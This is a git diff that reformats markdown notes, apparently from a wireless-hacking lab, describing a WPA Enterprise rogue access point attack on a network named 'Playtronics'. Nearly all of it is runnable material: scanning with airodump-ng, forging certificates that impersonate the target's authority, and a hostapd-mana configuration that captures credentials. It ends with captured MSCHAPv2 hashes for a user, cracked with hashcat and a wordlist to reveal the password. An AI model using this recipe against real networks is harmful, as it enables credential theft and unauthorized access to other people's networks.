@@ -1,18 +1,24 @@
 ## WPA Enterprise
 
-
+```text
 sudo airodump-ng wlan0mon
-
-
+```
+```text
 BSSID              PWR Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 FC:EC:DA:8F:2E:90  -40     639       19    1   2  300. WPA2 CCMP   MGT  Playtronics
+```
 
-to mimick this AP
+### To mimick this AP
 
+### Setup Certificates
+
+```text
 sudo apt install freeradius
 sudo -s
 cd /etc/freeradius/3.0/certs
+```
 
+```text
 nano ca.cnf
 ....
 [certificate_authority]
@@ -23,7 +29,9 @@ organizationName        = Playtronics
 emailAddress            = ca@playtronics.com
 commonName              = "Playtronics Certificate Authority"
 ....
+```
 
+```text
 nano server.cnf
 ....
 [server]
@@ -34,14 +42,19 @@ organizationName        = Playtronics
 emailAddress            = admin@playtronics.com
 commonName              = "Playtronics"
 ....
+```
 
+```text
 rm dh
 make destroycerts
+```
 
+### Setup hostapd-mana - AP
+```text
 sudo apt install hostapd-mana
-
+```
+```text
 nano /etc/hostapd-mana/mana.conf
-
 
 ssid=Playtronics
 interface=wlan0
@@ -67,28 +80,32 @@ mana_wpe=1
 mana_credout=/tmp/hostapd.credout
 mana_eapsuccess=1
 mana_eaptls=1
-
-
+```
+```text
 nano /etc/hostapd-mana/mana.eap_user
 
 *     PEAP,TTLS,TLS,FAST
 "t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+```
 
-#start the AP with certificate
+
+### start the AP with certificate
+```text
 sudo hostapd-mana /etc/hostapd-mana/mana.conf
+```
 
-
-OUTPUT FROM A USER LOGGINING IN
-
+### Output
+```text
 MANA EAP EAP-MSCHAPV2 ASLEAP user=user1 | asleap -C 5f:57:b0:b6:d1:6d:e0:82 -R e7:db:11:00:06:f7:49:02:0e:e9:17:61:c8:d2:d4:a4:e5:4b:a7:fa:9b:97:81:4e
 MANA EAP EAP-MSCHAPV2 JTR | user1:$NETNTLM$5f57b0b6d16de082$e7db110006f749020ee91761c8d2d4a4e54ba7fa9b97814e:::::::
 MANA EAP EAP-MSCHAPV2 HASHCAT | user1::::e7db110006f749020ee91761c8d2d4a4e54ba7fa9b97814e:5f57b0b6d16de082
+```
 
-## Hashcat
+### Hashcat
 5500 | NetNTLMv1 / NetNTLMv1+ESS
 
+```text
 echo user1::::e7db110006f749020ee91761c8d2d4a4e54ba7fa9b97814e:5f57b0b6d16de082 > wpa_enterprise.txt
-
 hashcat -m 5500 wpa_enterprise.txt rockyou.txt
 
 user1::::e7db110006f749020ee91761c8d2d4a4e54ba7fa9b97814e:5f57b0b6d16de082:password1
@@ -96,7 +113,7 @@ user1::::e7db110006f749020ee91761c8d2d4a4e54ba7fa9b97814e:5f57b0b6d16de082:passw
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
-
+```
 
 
 
